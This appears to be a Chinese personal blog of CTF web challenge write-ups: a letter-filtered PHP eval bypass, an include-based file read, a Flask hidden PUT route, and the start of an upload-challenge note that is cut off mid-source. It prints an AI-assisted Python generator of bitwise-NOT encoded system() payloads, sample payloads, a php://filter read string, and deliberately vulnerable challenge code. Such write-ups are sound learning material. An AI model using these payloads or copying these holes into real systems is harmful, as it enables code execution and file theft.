<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;\t&#x27;</span>,<span class="hljs-string">&#x27;\r&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>,<span class="hljs-string">&#x27;\[&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\-&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\*&#x27;</span>,<span class="hljs-string">&#x27;\?&#x27;</span>,<span class="hljs-string">&#x27;\&lt;&#x27;</span>,<span class="hljs-string">&#x27;\&gt;&#x27;</span>,<span class="hljs-string">&#x27;\=&#x27;</span>,<span class="hljs-string">&#x27;\`&#x27;</span>,];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$wllm</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);<br>    &#125;&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="hljs-variable">$wllm</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;蔡总说：注意审题！！！&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> 蔡总说：注意审题！！！<br></code></pre></td></tr></table></figure>
<p>这都过滤了啥，给deepseek看看<br>d导思考了很久，给了几个payload，都无法起效  </p>
<p>上网一找，看来这种应该叫做无字母rec，如名字，就是无法传入字母字符啥的<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15404150.html">https://www.cnblogs.com/pursue-security/p/15404150.html</a>  </p>
<p>故叫d导帮写了个脚本来构造payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_neg_payload</span>(<span class="hljs-params">s</span>):<br>    payload = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        neg = (~<span class="hljs-built_in">ord</span>(c)) &amp; <span class="hljs-number">0xFF</span>  <span class="hljs-comment"># 取反并转换为无符号字节</span><br>        payload.append(<span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;neg:02X&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_command</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-comment"># 匹配 function(&#x27;argument&#x27;) 格式</span><br>    pattern = <span class="hljs-string">r&#x27;^\s*?(\w+?)\s*?\(\s*?[\&#x27;&quot;](.*?)[\&#x27;&quot;]\s*?\)\s*?;?&#x27;</span><br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(pattern, cmd)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;命令格式错误！请使用 function(&#x27;argument&#x27;) 格式&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入PHP命令（示例：system(&#x27;ls /&#x27;)：&quot;</span>).strip()<br>    <span class="hljs-keyword">try</span>:<br>        func, arg = parse_command(cmd)<br>        <br>        <span class="hljs-comment"># 生成函数名和参数的取反payload</span><br>        func_neg = generate_neg_payload(func)<br>        arg_neg = generate_neg_payload(arg)<br>        <br>        payload = <span class="hljs-string">f&quot;(~<span class="hljs-subst">&#123;func_neg&#125;</span>)(~<span class="hljs-subst">&#123;arg_neg&#125;</span>);&quot;</span><br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n生成的取反Payload：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n使用说明：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. 需要目标环境开启短标签支持&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. 确保PHP版本支持这种调用方式&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. 实际使用时可能需要URL编码整个payload&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4. 示例最终形式：?code=~%8C%86%8C%8B%9A%92~%93%8C%DF%D0&quot;</span>)<br>        <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误：<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>生成的取反Payload：<br>(~%8C%86%8C%8B%9A%92)(~%93%8C);<br><br><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>生成的取反Payload：<br>(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);<br><br><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flllllaaaaaaggggggg&#x27;</span>); <br>生成的取反Payload：<br>(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);<br></code></pre></td></tr></table></figure>

<h1 id="SWPUCTF-2022-新生赛-ez-ez-php"><a href="#SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_php"></a>[SWPUCTF 2022 新生赛]ez_ez_php</h1><p>开题给源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) === <span class="hljs-string">&quot;php&quot;</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Nice!!!&quot;</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <br><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">//flag.php</span><br></code></pre></td></tr></table></figure>
<p>源码大概意思是有个substr函数截取file传入参数前3位，所以前3位得是’php’，这直接就是提示伪协议了啊</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">NSSCTF&#123;flag<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_n</span>ot<span class="hljs-number">_</span>here&#125;<br>real<span class="hljs-number">_f</span>lag<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span><span class="hljs-keyword">in</span><span class="hljs-number">_</span><span class="hljs-string">&#x27;flag&#x27;</span><br>换个思路，试试PHP伪协议呢<br></code></pre></td></tr></table></figure>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag<br>拿到正确flag，但是啊但是</p>
<p>尽然直接访问&#x2F;flag 就能拿</p>
<h1 id="GDOUCTF-2023-EZ-WEB"><a href="#GDOUCTF-2023-EZ-WEB" class="headerlink" title="[GDOUCTF 2023]EZ WEB"></a>[GDOUCTF 2023]EZ WEB</h1><p>打开题目是一个假按钮，扫了一下发现&#x2F;src有如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> flask<br><br>app = flask.Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>) </span><span class="hljs-comment">## GET 方式访问 / 就返回index.html</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>  <span class="hljs-keyword">return</span> flask.send_file(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>  <span class="hljs-keyword">return</span> flask.send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/super-secret-route-nobody-will-guess&#x27;</span>, methods=[<span class="hljs-string">&#x27;PUT&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure>
<p>老规矩，先问d导  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X PUT http://node5.anna.nssctf.cn:28256/super-secret-route-nobody-will-guess<br></code></pre></td></tr></table></figure>
<p>直接返回flag，行，看看源码<br>好像是规定了几个条件  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## GET 方式访问 / 就返回index.html</span><br><span class="hljs-comment">## GET 方式访问 /src 就返回 app.py</span><br><span class="hljs-comment">## PUT 方式访问 /super-secret-route-nobody-will-guess 就打开flag，然后read它</span><br></code></pre></td></tr></table></figure>
<p>那我猜这可能是一个python后端？<br>以前也没见过，那现在知道了</p>
<hr>
<h2 id="title-note-37date-2025-06-02-03-27-46tags"><a href="#title-note-37date-2025-06-02-03-27-46tags" class="headerlink" title="title: note-37date: 2025-06-02 03:27:46tags:"></a>title: note-37<br>date: 2025-06-02 03:27:46<br>tags:</h2><h1 id="Mini-L-CTF-miniup"><a href="#Mini-L-CTF-miniup" class="headerlink" title="Mini L-CTF miniup"></a>Mini L-CTF miniup</h1><p>在查看图片处直接查看index.php能得到源码  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dufs_host</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$dufs_port</span> = <span class="hljs-string">&#x27;5000&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;upload&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>        <span class="hljs-variable">$allowed_extensions</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>, <span class="hljs-string">&#x27;webp&#x27;</span>];<br>        <br>        <span class="hljs-variable">$file_extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>, PATHINFO_EXTENSION));<br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_extension</span>, <span class="hljs-variable">$allowed_extensions</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;只允许上传图片文件&#x27;</span>]);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$target_url</span> = <span class="hljs-string">&#x27;http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-variable">$filename</span>);<br>        <br>        <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$target_url</span>);<br>        <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_CUSTOMREQUEST, <span class="hljs-string">&#x27;PUT&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="hljs-variable">$file_content</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, [<br>            <span class="hljs-string">&#x27;Host: &#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Origin: http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Referer: http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept-Encoding: gzip, deflate&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept: */*&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept-Language: en,zh-CN;q=0.9,zh;q=0.8&#x27;</span>,<br>            <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 